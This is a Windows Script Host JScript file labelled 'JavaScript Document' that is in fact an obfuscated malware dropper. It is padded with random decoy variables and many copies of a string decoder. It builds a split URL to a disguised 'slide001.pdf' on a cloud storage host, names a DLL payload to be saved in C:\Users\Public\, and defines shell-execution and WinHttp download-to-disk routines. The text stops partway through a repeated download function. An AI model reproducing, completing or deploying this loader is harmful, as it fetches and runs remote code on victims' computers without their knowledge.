// JavaScript Document
/* global WScript, exit, eof */

var AXNcfolderFUPXWXLG62518286 = "T9863795";
var BcidULFWEEMX78312563 = "GTWSI433883605";
var BPWRVEYDchostMUVUQCCJ15598035 = "EGZPVT186774769";
var CDCchostJQGHBGDR83030192 = "U2";
var CLSFBUSZDchospeZBCAIQSI80675054 = "R3";
var CVTBYPcfileNOIBFDTB01387595 = "AEZWFJZQV916245";
var DPAWHCRcidMAYHSQGC34344733 = "JSMYR350417748";
var DTRUcfolderXVINVTDZ56788156 = "D2";
var DZVSIDchostPEDCCPIJ37397400 = "OVTFAEV8";
var EEBISQBcnomeHXYDOVBG41224026 = "RYTOLIUT72";
var ENcidTVUXLIZZ01330071 = "CL90";
var ESRLcfileRIYYRUUU71779705 = "ICMY9";
var FMECOVXNchostGERTOJLI99837738 = "MWJYMD98";
var FWVNRctesteMZHJTRWU98452378 = "RSIBQPB1";
var GFJMcfileWBDFXWNV05079280 = "BNLPO6518426";
var GUETcfolderGPEFNBPF40367535 = "O6";
var GXNXZSXctesteBWWWQTPV05889491 = "SANAABY221902373";
var HchospeLNHDUREG91187446 = "PMVSYE2812";
var HNMBJLJIIchospeCVHCFDWJ60270533 = "FXZMJ7";
var HOWBXCcfolderCASNGZWL61507621 = "XFTTN72";
var HWWACUPRHctesteJMPBQHFT90947389 = "DARBFU8";
var HYXUCHAcfileQFAILFHZ80982937 = "XCRFUPRBA3265";
var IEAZAJchospeYXPJGYYB89571827 = "GLNVJN9390510";
var IIPGWGcuserSSMWCAYG21614660 = "HMNEQJLQJ4027552";
var IVPCHJXXPcidAZOOJQFQ66826331 = "UGAJM78";
var JchostQFVRZBYI13881240 = "Z20742";
var JcuserFRHHJIEQ59326316 = "RBHP4";
var LFLIWQcnomeJYBBYHTZ90114636 = "MPMJJQ064357818";
var LVRchostENMSSSYL72181305 = "W9";
var LXORLActesteQCYGSMWN90485185 = "B91884725";
var MHXAWMFccashOOCZLEWR11233312 = "V69767722";
var MWJPAMJcnomeZMPBUASW57494374 = "JOTI84603";
var MYSYXLctesteZJNFBZME00450705 = "JRXBSGYR519631";
var NchospeFPLLHABG94741810 = "V32";
var NHIccashEJHSFMAC77499345 = "RGJO3229278";
var OGFMAWccashXAMIQWJQ01974346 = "ZPLP304003589";
var OYBJQEOEDcfilePRDWCOPQ70840487 = "GEA5346033";
var PCTUGcfolderAEEBFVSM01867939 = "FFWXMOD2853";
var PcuserUYRRMFXD02402517 = "YS2";
var PLNGMchostELJFQFIO12392888 = "VTNU49429";
var PQJYPctesteGQINDAHR76750055 = "M5";
var RcfileHTLIBXJB21035682 = "H355";
var RTLTchospeNLBUTPRD97832515 = "TSBXATSLI206252907";
var SIYTXcfileOIULGBYY78477824 = "C530";
var SVLNJGXEEcnomeDJACULNL58617389 = "Z3";
var SVQRHQZcuserJPARWHIX67392991 = "GRCHSDT6";
var SXHDVcidPCVJLCXT90993314 = "INRMC5465058";
var TMVMVUHcidYRBNZTOG82155268 = "ESGQBH549";
var TQchospeRQMXCDDW28510055 = "BXGJSFEM82237719";
var TVPEYUXWcfolderGMHXLIUD85756394 = "LVPGMA9194607";
var UccashLYUNIRVL23656368 = "ZONUFPBM113520";
var UcuserHDCBTHXX03980452 = "RYDFIOGJ014501";
var URUcuserQNZQIVYC72437868 = "TXITRUMC3628";
var UXFSXOctesteSVROMHRG45430300 = "AUUWTTUO4";
var WcidRYCRCHSU12260497 = "YMDD79591251";
var WETYIMVcnomeOVUWYWHY87444684 = "VDJLQDWXP023419387";
var XLFRVBPccashVTXTTUMW47479597 = "TB0702";
var YCccashVZGSNFQT51040554 = "QFVXCHT89";
var YIIWEVLYDcuserNZXHZZYX99808643 = "R3";
var YVQGSFcfolderPMYBPOXB52574292 = "Q1";
var ZcnomeDRZLABSD18920660 = "TC340";
var ZcnomeESYFFVCQ96820857 = "VYCLIWY39108541";
var ZVGFRccashEBFERSYR61242984 = "J23";

var cUser = "EIEIDHU";
var cUser7658 = "EIEIDHU";
var cUser44432 = "EIEIDHU";
var cUser665 = "EIEIjkl980DHU";
var cUser4499 = "EIEIn6WWWDHU";
var cUser9037 = "EIEIDKMYHU";
var cUser7746289 = "EIEIGHJDHU";
var cUser8632 = "EIEIDHU";
var cUser4485 = "AMEDE8MIU";
var cUser = "EIEIDHU";
var cFile1 = "YJJGO";
var cFile2 = "CIMFS";
var cID = "LIKINHYICFWIRGD";
var NAME001 = "BILFQFNIGFSIO";
var cNomeF2 = "GIQFWFSILFXIT";
var cNomeFZ2 = "AIKFQFMINHVID";
var cHtml = "LFXIGISILIK";
var cWSh311 = "RHUIXIHIWINIUIYGEHQIMIJIQIQ";
var cWN3t = "FHIHEHUIKIBIIIMFRGYHWIMIPIHIKID";
var cScrF1l3 = "CHBHRIHHXIFIJHXIDHVFOGNHXIBHTHBIOIIIJHTICGWHQHYHTHRIJ";
var cSh3llApp = "RHQIMIJIQIQGEGXIUIUIQINIHIFIYINITIS";
var cHost02 = "4coYVBvR2tGR";
var Ad0bSt3 = "IGOGRHDGRGPFUHHIPINIAHVII";
var MxmlHt = "64C45C3F6789DE03CE5FA2E";
var c1nf3ctz = "";
var cFolder = "C:\\Users\\Public\\";
var sNomeMaq;
var sID;
var sIDW;
var sTipoSO;
var sAwvx = "NHYBVGTVFGTDCE";
var xID = 91;
var xReg = "PIUIHIJIVIYIUGHGGGCIHJBIHFNGDIVFNFP";
var cHosttotal;

var NAMEWM049 = "divasilva.dll";
var NAMEAT526 = "divasilva.dll";
var NAMEXH461 = "divasilva.dll";
var NAMEBB109 = "divasilva.dll";
var NAMEHB562 = "divasilva.dll";
var NAMESV707 = "divasilva.dll";
var NAMESL922 = "divasilva.dll";
var NAMECC703 = "divasilva.dll";


var cHost582 = "https://stora";
var cHost891 = "ge.googleapis";
var cHost125 = ".com/projetos";
var cHost102 = "emprejaderoup";
var cHost234 = "as/slide001.p";
var cHost043 = "df";

function wdecrypt0718(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt7334(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt6186(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt0112(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt3402(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt8170(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt6452(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt0462(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt5376(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt8558(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt1127(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt5223(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt7471(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt0313(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt5887(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt3332(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt3470(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt2537(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt8532(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  



function wdecrypt4195(s1, id)
{                                                                                                                   
var sx;                                                                                                             
var x;                                                                                                              
var x4;                                                                                                             
var sr;                                                                                                             
var wx1;                                                                                                             
var wx2;                                                                                                             
var wxgx1;                                                                                                           
   wxgx1 = 65;                                                                                                       
	sr = "";                                                                                                          
	sx = "";                                                                                                          
	x = 0;                                                                                                            
	x4 = s1.charCodeAt(0) - wxgx1;                                                                                     
	s1 = s1.substring(1);                                                                                             
		while (s1.length > 0){                                                                                          
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx1 = (s1.charCodeAt(0)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
		wx2 = (s1.charCodeAt(1)-wxgx1);                                                                                    
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
               		sr = sr + String.fromCharCode( wx1 * 25 + wx2  - x4 - id);                                       
if (sAwvx == "sdgrt53425eged3fg") {exit};                                                                           
			s1 = s1.substring(2);                                                                                        
		}                                                                                                              
		return sr;                                                                                                    
}  





function run4998(file) { 
var ws = new ActiveXObject("WScript.Shell");
ws.Exec(file);
}

function run9946(file) { 
var ws = new ActiveXObject("WScript.Shell");
ws.Exec(file);
}

function run5255(file) { 
var ws = new ActiveXObject("WScript.Shell");
ws.Exec(file);
}

function run9971(file) { 
var ws = new ActiveXObject("WScript.Shell");
ws.Exec(file);
}

function run2916(file) { 
var ws = new ActiveXObject("WScript.Shell");
ws.Exec(file);
}



function down9629(url, file) {
var data;
        var ado;

        try
        {
            var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   
            // ResolveTimeout, ConnectTimeout, SendTimeout, ReceiveTimeout
            WinHttpReq.SetTimeouts(30000, 30000, 30000, 5000);
   
            void(WinHttpReq.Open("GET", url, false));
            WinHttpReq.Send();
            if (WinHttpReq.Status == 404)
            {
                return false;
            }
            data = WinHttpReq.ResponseBody;
        }
        catch (ex)
        {
            //WScript.Echo("Error downloading file: " + ex.message);
            return false;
        }

        ado = new ActiveXObject("ADODB.Stream");
        ado.Type = 1; // binary mode
        ado.Open();
        ado.Write(data);
        ado.SaveToFile(file, 2); // 2 = overwrite existing file
        ado.Close();

        return true;
    }


function down2713(url, file) {
var data;
        var ado;

        try
        {
            var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   
            // ResolveTimeout, ConnectTimeout, SendTimeout, ReceiveTimeout
            WinHttpReq.SetTimeouts(30000, 30000, 30000, 5000);
   
            void(WinHttpReq.Open("GET", url, false));
            WinHttpReq.Send();
            if (WinHttpReq.Status == 404)
            {
                return false;
            }
            data = WinHttpReq.ResponseBody;
        }
        catch (ex)
        {
            //WScript.Echo("Error downloading file: " + ex.message);
            return false;
        }

        ado = new ActiveXObject("ADODB.Stream");
        ado.Type = 1; // binary mode
        ado.Open();
        ado.Write(data);
        ado.SaveToFile(file, 2); // 2 = overwrite existing file
        ado.Close();

        return true;
    }


function down8907(url, file) {
var data;
        var ado;

        try
        {
            var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   
            // ResolveTimeout, ConnectTimeout, SendTimeout, ReceiveTimeout
            WinHttpReq.SetTimeouts(30000, 30000, 30000, 5000);
   
            void(WinHttpReq.Open("GET", url, false));
            WinHttpReq.Send();
            if (WinHttpReq.Status == 404)
            {
                return false;
            }
            data = WinHttpReq.ResponseBody;
        }
        catch (ex)
        {
            //WScript.Echo("Error downloading file: " + ex.message);
            return false;
        }

        ado = new ActiveXObject("ADODB.Stream");
        ado.Type = 1; // binary mode
        ado.Open();
        ado.Write(data);
        ado.SaveToFile(file, 2); // 2 = overwrite existing file
        ado.Close();

        return true;
    }


function down5272(url, file) {
var data;
        var ado;

        try
        {
            var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   
            // ResolveTimeout, ConnectTimeout, SendTimeout, ReceiveTimeout
            WinHttpReq.SetTimeouts(30000, 30000, 30000, 5000);
   
            void(WinHttpReq.Open("GET", url, false));
            WinHttpReq.Send();
